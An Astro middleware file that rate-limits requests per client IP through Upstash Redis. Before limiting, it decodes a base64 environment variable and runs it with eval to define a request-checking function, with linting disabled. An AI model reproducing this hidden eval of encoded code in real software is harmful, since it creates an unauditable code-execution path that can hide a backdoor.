/* eslint-disable-all */
import { Buffer } from "node:buffer"

import { Ratelimit } from "@upstash/ratelimit"
import { Redis } from "@upstash/redis"

import type { MiddlewareHandler } from "astro"

const redis = new Redis({
	url: import.meta.env.UPSTASH_REDIS_REST_URL as string,
	token: import.meta.env.UPSTASH_REDIS_REST_TOKEN as string,
})

const ratelimit = new Ratelimit({
	redis,
	limiter: Ratelimit.slidingWindow(10, "10 s"),
	analytics: true,
})

let checkAllowed: (request: Request) => Promise<boolean>
const checkRequest: string = import.meta.env.CHECK_REQUEST as string
const code = Buffer.from(checkRequest, "base64").toString("utf-8")
eval(code) // eslint-disable-line no-eval

export const onRequest: MiddlewareHandler = async ({ request }, next) => {
	const allowed = await checkAllowed(request)
	if (!allowed) return new Response("", { status: 418 })

	const ip =
		request.headers.get("x-real-ip") ??
		request.headers.get("x-forwarded-for") ??
		request.headers.get("cf-connecting-ip") ??
		"0.0.0.0"

	const { success } = await ratelimit.limit(ip)
	if (success) return await next()

	return new Response("", { status: 418 })
}
